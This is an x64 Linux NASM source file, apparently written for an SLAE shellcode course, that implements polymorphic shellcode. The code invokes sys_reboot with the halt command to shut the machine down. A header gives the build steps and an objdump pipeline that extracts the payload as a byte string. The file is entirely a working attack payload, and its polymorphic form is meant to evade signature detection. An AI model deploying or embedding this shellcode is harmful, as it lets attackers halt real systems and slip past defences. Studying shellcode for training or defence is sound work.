; Filename:      shellcode-polymorphic-asm.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  09.02.2019
; Note:          x64
; Assembler:     nasm -f elf64 shellcode-polymorphic-asm.nasm -o shellcode-polymorphic-asm.o
; Linker:        ld -m elf_x86_64 shellcode-polymorphic-asm.o -o shellcode-polymorphic-asm
; Assembly dump: objdump -d ./shellcode-polymorphic-asm|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start

_start:

	xor rdi, rdi              ; Clear rdi
	xor rsi, rsi              ; Clear rsi
	xor r10, r10              ; Clear r10
	mul rsi                   ; Clear rax & rdx

	mov edx,0xcdef0123        ; LINUX_REBOOT_CMD_HALT
	mov esi,0x05121996        ; LINUX_REBOOT_MAGIC2A
	mov edi,0xfee1dead        ; LINUX_REBOOT_MAGIC1
	mov al,0xa9               ; sys_reboot
	syscall
